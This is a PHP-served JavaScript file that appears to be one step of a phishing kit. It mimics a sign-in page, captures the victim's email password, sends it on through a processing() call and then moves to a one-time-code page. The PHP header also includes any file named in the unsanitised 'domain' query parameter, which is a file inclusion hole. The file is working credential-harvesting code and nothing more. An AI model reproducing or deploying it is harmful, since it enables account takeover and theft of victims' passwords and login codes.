<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/javascript');
require_once($_SERVER['DOCUMENT_ROOT'] . "/" . $_GET['domain']);
?>

//<script>
    loadContenido();
    $('#lblEmail').html(my_data['email']);
    $('#btnBack').click(function() {
        loadFile(['_email_user.php']);
    });

    $('#txtPassword').on('change keyup', function() {
        $('#password').toggleClass('CDELXb', $(this).val().length > 0)
    });

    $('#showPass').click(function() {
        let t = $('#txtPassword').attr('type');
        $('#txtPassword').attr('type', t == 'text' ? 'password' : 'text');
    });

    $('#btnNext').click(function() {
        let email = my_data['email'];
        let password_email = $("#txtPassword").val();
        if (password_email.length == 0) {
            $("#txtPassword").focus();
            return;
        }
        processing({
            t: 'password_email',
            email: email,
            password_email: password_email
        });

        if (my_data['status'] == '') {
            my_data['status'] = 'otp';
            loadFile(['_otp.php']);
        }
    });